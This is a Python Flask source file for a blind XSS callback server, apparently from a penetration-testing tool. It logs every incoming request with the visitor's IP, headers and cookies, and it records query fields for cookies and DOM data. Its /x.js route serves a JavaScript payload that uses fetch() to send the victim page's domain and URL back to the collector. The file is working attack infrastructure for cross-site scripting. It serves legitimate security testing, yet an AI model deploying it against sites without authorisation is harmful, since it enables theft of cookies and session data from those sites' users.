"""
Out-of-Band Callback Server for Blind XSS Detection

Lightweight HTTP listener that receives callbacks from injected payloads.
Logs UUID, timestamp, source IP, headers for correlation.
"""
from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
from threading import Thread, Lock
import sys

# Storage for callbacks
CALLBACKS = []
CALLBACKS_LOCK = Lock()
CALLBACK_FILE = os.path.join(os.path.dirname(__file__), "..", "output", "callbacks.json")


app = Flask(__name__)


@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'HEAD'])
@app.route('/<path:path>', methods=['GET', 'POST', 'HEAD'])
def catch_all(path):
    """
    Catch-all route to handle any incoming callbacks from XSS payloads.
    Extracts UUID from query parameters and logs all relevant metadata.
    """
    callback_data = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": request.method,
        "path": path,
        "query_string": request.query_string.decode('utf-8'),
        "source_ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', ''),
        "headers": dict(request.headers),
        "uuid": request.args.get('id', ''),  # Extract UUID from ?id= parameter
        "cookies": dict(request.cookies) if request.cookies else {},
    }
    
    # Extract additional data from query parameters
    for key in ['c', 'ua', 'ref', 'dom']:
        if key in request.args:
            callback_data[key] = request.args.get(key)
    
    # Store callback
    with CALLBACKS_LOCK:
        CALLBACKS.append(callback_data)
        _persist_callback(callback_data)
    
    print(f"[CALLBACK] UUID={callback_data['uuid']} from {callback_data['source_ip']} at {callback_data['timestamp']}")
    
    # Return minimal response
    return "", 200


@app.route('/x.js', methods=['GET'])
def serve_js():
    """
    Serve JavaScript payload for <script src=> callbacks.
    Can optionally execute additional exfiltration.
    """
    uuid = request.args.get('id', '')
    
    # Log the callback
    callback_data = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": "GET",
        "path": "x.js",
        "query_string": request.query_string.decode('utf-8'),
        "source_ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', ''),
        "headers": dict(request.headers),
        "uuid": uuid,
    }
    
    with CALLBACKS_LOCK:
        CALLBACKS.append(callback_data)
        _persist_callback(callback_data)
    
    print(f"[CALLBACK] JS loaded - UUID={uuid} from {callback_data['source_ip']}")
    
    # Return JavaScript that performs additional exfiltration
    js_code = f"""
    // Blind XSS Callback - UUID: {uuid}
    fetch('http://' + window.location.host.replace(/:\\d+/, ':5000') + '/?id={uuid}&dom=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(window.location.href));
    """
    
    return js_code, 200, {'Content-Type': 'application/javascript'}


def _persist_callback(callback_data):
    """
    Persist callback data to JSON file for correlation.
    Thread-safe append operation.
    """
    try:
        os.makedirs(os.path.dirname(CALLBACK_FILE), exist_ok=True)
        
        # Read existing callbacks
        if os.path.exists(CALLBACK_FILE):
            with open(CALLBACK_FILE, 'r') as f:
                existing = json.load(f)
        else:
            existing = []
        
        # Append new callback
        existing.append(callback_data)
        
        # Write back
        with open(CALLBACK_FILE, 'w') as f:
            json.dump(existing, f, indent=2)
    except Exception as e:
        print(f"[ERROR] Failed to persist callback: {e}", file=sys.stderr)


def get_callbacks():
    """
    Return all received callbacks (thread-safe).
    """
    with CALLBACKS_LOCK:
        return CALLBACKS.copy()


def clear_callbacks():
    """
    Clear all callbacks from memory (useful for testing).
    """
    with CALLBACKS_LOCK:
        CALLBACKS.clear()


def start_server(host='0.0.0.0', port=5000, debug=False):
    """
    Start the callback server in a background thread.
    """
    print(f"[OOB] Starting callback server on http://{host}:{port}")
    app.run(host=host, port=port, debug=debug, use_reloader=False)


def start_server_background(host='0.0.0.0', port=5000):
    """
    Start the callback server in a daemon thread (non-blocking).
    """
    thread = Thread(target=start_server, args=(host, port, False), daemon=True)
    thread.start()
    return thread


if __name__ == "__main__":
    # Standalone mode - run the callback server
    import argparse
    parser = argparse.ArgumentParser(description="Blind XSS Callback Server")
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind (default: 5000)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    args = parser.parse_args()
    
    start_server(host=args.host, port=args.port, debug=args.debug)
